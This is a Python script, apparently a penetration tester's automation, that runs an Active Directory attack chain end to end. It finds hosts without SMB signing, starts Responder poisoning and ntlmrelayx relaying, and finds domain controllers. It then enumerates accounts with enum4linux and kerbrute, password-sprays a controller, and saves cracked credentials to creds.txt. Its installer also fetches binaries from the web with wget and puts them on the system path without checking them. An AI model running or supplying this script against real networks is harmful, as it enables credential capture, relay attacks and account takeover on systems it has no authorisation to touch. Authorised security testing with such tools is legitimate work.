import subprocess
import os
import re
import shutil
import sys
def check_and_install_tools():
    tools = {
        "nxc": "https://github.com/Pennyw0rth/NetExec",
        "responder": "apt-get install responder",
        "enum4linux": "apt-get install enum4linux",
        "kerbrute": "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64",
	      "likely_usernames": "https://github.com/insidetrust/statistically-likely-usernames",
        "terminator": "apt-get install terminator"
    }
    for tool, install_cmd in tools.items():
        if not shutil.which(tool):
            print(f"{tool} not found.")
            if install_cmd:
                print(f"Attempting to install {tool}...")
                if "http" in install_cmd:
                    subprocess.run(f"wget -O {tool} {install_cmd} && chmod +x {tool} && mv {tool} /usr/local/bin/", shell=True, check=True)
                else:
                    subprocess.run(install_cmd, shell=True, check=True)
                if not shutil.which(tool):
                    print(f"Failed to install {tool}. Please install it manually.")
                    sys.exit(1)
            else:
                print(f"{tool} is required but not found. Please install it manually.")
                sys.exit(1)
        else:
            print(f"{tool} is installed and available.")
def run_nxc_smb(target_file, output_dir):
    smb_command = f"nxc smb {target_file}"
    print(f"Running command: {smb_command}")
    try:
        result = subprocess.run(smb_command, shell=True, capture_output=True, text=True, check=True)
        print("Command output:")
        print(result.stdout)
        input("Press Enter to continue after reviewing the output...")
        smb_signing_path = os.path.join(output_dir, "smb_signing.txt")
        with open(smb_signing_path, "w") as signing_file:
            signing_file.write(result.stdout)
        print(f"Output of `{smb_command}` has been written to `{smb_signing_path}`.")
        extract_ips_with_no_signing(result.stdout, output_dir)
    except subprocess.CalledProcessError as e:
        print(f"Error running command '{smb_command}': {e}")
        print(f"Command output: {e.output}")
        print(f"Command stderr: {e.stderr}")
        exit(1)
def extract_ips_with_no_signing(output, output_dir):
    ip_signing_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+).*signing:\s*False', re.IGNORECASE)
    ip_addresses = ip_signing_pattern.findall(output)
    if ip_addresses:
        smb_tf_path = os.path.join(output_dir, "smb_tf.txt")
        with open(smb_tf_path, "w") as relay_file:
            for ip in ip_addresses:
                relay_file.write(f"{ip}\n")
        print(f"IP addresses with 'signing:false' have been written to `{smb_tf_path}`.")
    else:
        print("No 'signing:false' entries found.")
        open(os.path.join(output_dir, "smb_tf.txt"), 'w').close()
def extract_fqdns(file_path, output_dir):
    fqdns = set()
    with open(file_path, 'r') as file:
        for line in file:
            fqdn_match = re.search(r'(\S+\.\S+)$', line)
            if fqdn_match:
                fqdns.add(fqdn_match.group(1).strip().lower())
    dc_hosts_path = os.path.join(output_dir, 'dc_hosts.txt')
    with open(dc_hosts_path, "w") as dc_file:
        for fqdn in sorted(fqdns):
            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', fqdn):  # Exclude IP addresses
                dc_file.write(f"{fqdn}\n")
    return fqdns
def resolve_fqdns_to_last_ip(fqdns_file, output_dir):
    ip_addresses = set()
    with open(fqdns_file, 'r') as file:
        dcs_path = os.path.join(output_dir, 'dcs.txt')
        with open(dcs_path, 'w') as ip_file:
            for fqdn in file:
                fqdn = fqdn.strip()
                if fqdn:
                    nslookup_result = subprocess.run(['nslookup', fqdn], capture_output=True, text=True)
                    ip_matches = re.findall(r'Address:\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', nslookup_result.stdout)
                    if ip_matches:
                        last_ip_address = ip_matches[-1]
                        if last_ip_address not in ip_addresses:
                            ip_addresses.add(last_ip_address)
                            ip_file.write(f"{last_ip_address}\n")
    return ip_addresses
def extract_usernames(input_files, output_file):
    usernames = set()
    for input_file in input_files:
        if os.path.exists(input_file):
            with open(input_file, 'r') as file:
                for line in file:
                    if "VALID USERNAME:" in line:
                        match = re.search(r'VALID USERNAME:\s*(\S+)', line)
                        if match:
                            full_username = match.group(1)
                            username = full_username.split('@')[0].strip()
                            if username:
                                usernames.add(username)
    with open(output_file, 'w') as output:
        for username in sorted(usernames):
            output.write(f"{username}\n")
    print(f"Usernames have been extracted to `{output_file}`")
def write_creds_to_file(output, output_file):
    with open(output_file, "w") as file:
        for line in output.splitlines():
            if '[+]' in line:
                match = re.search(r'\[\+\]\s+(\S+)\\(\S+):(\S+)', line)
                if match:
                    username = match.group(2).strip()
                    password = match.group(3).strip()
                    file.write(f"{username}:{password}\n")
    print(f"Credentials have been written to `{output_file}`")
def run_password_spray(dc_ip, users_file, password):
    password_spray_command = f"nxc smb {dc_ip} -u {users_file} -p '{password}' --continue-on-success"
    try:
        result = subprocess.run(password_spray_command, shell=True, capture_output=True, text=True, check=True)
        successful_output = '\n'.join([line for line in result.stdout.splitlines() if '[+]' in line])
        print("Successful attempts:")
        print(successful_output)
        write_creds_to_file(successful_output, "creds.txt")
    except subprocess.CalledProcessError as e:
        print(f"Error running password spray: {e}")
        print(f"Command output: {e.output}")
        print(f"Command stderr: {e.stderr}")
        exit(1)
def main():
    check_and_install_tools()
    customer_name = input("Customer name: ")
    domain_name = input("Domain name: ")
    target_file = input("Target file: ")
    # Prompt for the password at the start
    password = input("Enter the password to attempt a password spray: ")
    os.makedirs(customer_name, exist_ok=True)
    os.chdir(customer_name)
    run_nxc_smb(target_file, os.getcwd())
    responder_command = "responder -I eth0 --lm -v"
    subprocess.Popen(["terminator", "--new-tab", "-T", "Responder", "-e", responder_command])
    smb_tf_path = os.path.join(os.getcwd(), "smb_tf.txt")
    if os.path.exists(smb_tf_path) and os.path.getsize(smb_tf_path) > 0:
        relayx_command = "ntlmrelayx.py -smb2support -tf smb_tf.txt -socks -of relay_hashes"
        subprocess.Popen(["terminator", "--new-tab", "-T", "NTLMRelayX", "-e", relayx_command])
    nslookup_command = f"nslookup -type=srv _ldap._tcp.dc._msdcs.{domain_name}"
    nslookup_result = subprocess.run(nslookup_command, shell=True, capture_output=True, text=True)
    nslookup_file = os.path.join(os.getcwd(), "nslookup_dcs.txt")
    with open(nslookup_file, "w") as file:
        file.write(nslookup_result.stdout)
    fqdns = extract_fqdns(nslookup_file, os.getcwd())
    dc_ips = resolve_fqdns_to_last_ip(os.path.join(os.getcwd(), 'dc_hosts.txt'), os.getcwd())
    for dc_ip in dc_ips:
        enum_command = f"enum4linux {dc_ip}"
        enum_output_file = os.path.join(os.getcwd(), f"enum4linux_{dc_ip}.txt")
        subprocess.Popen(["terminator", "--new-tab", "-T", f"enum4linux_{dc_ip}", "-e", f"{enum_command} | tee {enum_output_file}"])
    kerbrute_base_command = f"kerbrute_linux_amd64 -d {domain_name}"
    service_accounts_command = f"{kerbrute_base_command} --dc {list(dc_ips)[0]} userenum statistically-likely-usernames/service-accounts.txt"
    user_accounts_command = f"{kerbrute_base_command} --dc {list(dc_ips)[0]} userenum statistically-likely-usernames/jsmith.txt"
    subprocess.run(service_accounts_command + " | tee service_accounts.txt", shell=True)
    subprocess.run(user_accounts_command + " | tee user_accounts.txt", shell=True)
    extract_usernames(['user_accounts.txt', 'service_accounts.txt'], os.path.join(os.getcwd(), 'users.txt'))
    print("User enumeration complete.")
    if os.path.exists("dcs.txt"):
        with open("dcs.txt", "r") as f:
            first_dc_ip = f.readline().strip()
            if first_dc_ip:
                run_password_spray(first_dc_ip, "users.txt", password)
if __name__ == "__main__":
    main()
